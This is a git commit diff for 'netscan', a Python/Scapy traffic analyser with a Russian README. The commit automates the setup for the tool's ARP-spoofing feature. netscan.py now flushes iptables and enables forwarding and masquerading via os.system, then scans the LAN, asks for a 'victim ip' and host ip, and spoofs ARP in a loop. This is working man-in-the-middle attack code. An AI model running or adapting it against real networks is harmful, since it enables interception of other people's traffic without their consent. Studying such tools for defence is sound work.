d845d36bc65244c9dae2e46414252ca295290d64
danilishinyar <danilishin.yar@gmail.com>
2020-11-17 22:10:16 +0300

    updated netscan

--- README.md
+++ README.md
@@ -1,6 +1,4 @@
 # Анализатор трафика
-## Используемые библиотеки
-* Scapy
 ## Реализованные функции
 * Выбор сетевого интерфейса для сниффинга
 * Выбор фильтра для анализа трафика
@@ -8,19 +6,10 @@
 * Вывод таблицы с IP и MAC адресами устройств в сети
 * ARP-спуфинг
   * Для его корректной работы необходимо выполнить следующие комманды:
-    * sudo -i
-
-    * echo 1 > /proc/sys/net/ipv4/ip_forward
-
-    * iptables --flush
-
-    * iptables -t nat --flush
-
-    * iptables --zero
-
-    * iptables -A FORWARD --in-interface wlp2s0  -j ACCEPT
-
-    * iptables -t nat --append POSTROUTING --out-interface YOUR INTERFACE MASQUERADE
+  ```
+  sudo -i
+  echo 1 > /proc/sys/net/ipv4/ip_forward
+  ```
 
 ## Пример работы
 ![](gif/howitworks-1.gif)
--- netscan.py
+++ netscan.py
@@ -3,10 +3,10 @@ import subprocess
 import re
 import time
 import threading
-
+import os
 
 def choose_iface_ip():
-    choose_ip = []
+    choose_ip = {}
     avaliable_ifaces = re.findall(r'\w+: ',str(subprocess.run(['ifconfig'], stdout = subprocess.PIPE)))
     avaliable_ip = re.findall(r'inet\s\d{3}.\d+.\d+.',str(subprocess.run(['ifconfig'], stdout = subprocess.PIPE)))
     for i in range(len(avaliable_ifaces)):
@@ -14,7 +14,7 @@ def choose_iface_ip():
             avaliable_ifaces[i] = avaliable_ifaces[i][1:]
 
     for i in range(len(avaliable_ifaces)):
-        choose_ip.append(avaliable_ifaces[i] + avaliable_ip[i].replace('inet ', '') + 'x')
+        choose_ip[avaliable_ifaces[i].replace(': ', '')]=avaliable_ip[i].replace('inet ', '') + '1/24'
     return choose_ip
 
 
@@ -36,18 +36,36 @@ def restore(victim_ip, host_ip):
     packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=scan[victim_ip], psrc=host_ip, hwsrc=scan[host_ip])
 
 
-print('Choose one:',*choose_iface_ip(), sep='\n')
-ip1 = str(input())
-ip = ip1.replace('x','1/24')
-scan = scan(ip)
+def iptables(iface):
+    os.system('/sbin/iptables --flush')
+    os.system('/sbin/iptables -t nat --flush')
+    os.system('/sbin/iptables --zero')
+    os.system('/sbin/iptables -A FORWARD --in-interface ' +  iface + ' -j ACCEPT')
+    os.system('/sbin/iptables -t nat --append POSTROUTING --out-interface ' + iface + ' -j MASQUERADE')
+
+
+print('Choose one:')
+for i in choose_iface_ip().items():
+    iface, ip = i
+    print("{:<20} {:<15}".format(iface, ip))
+
+iface1 = str(input())
+
+scan = scan(choose_iface_ip()[iface1])
 print("{:<20} {:<15}".format('IP','MAC'))
 for i in scan.items():
     ip, mac = i
     print("{:<20} {:<15}".format(ip, mac))
+
+iptables(iface1)
+
 print('Choose victim ip:')
 victim_ip = str(input())
 print('Choose host ip:')
 host_ip = str(input())
+
+
+
 try:
     while True:
         spoof(victim_ip,host_ip)
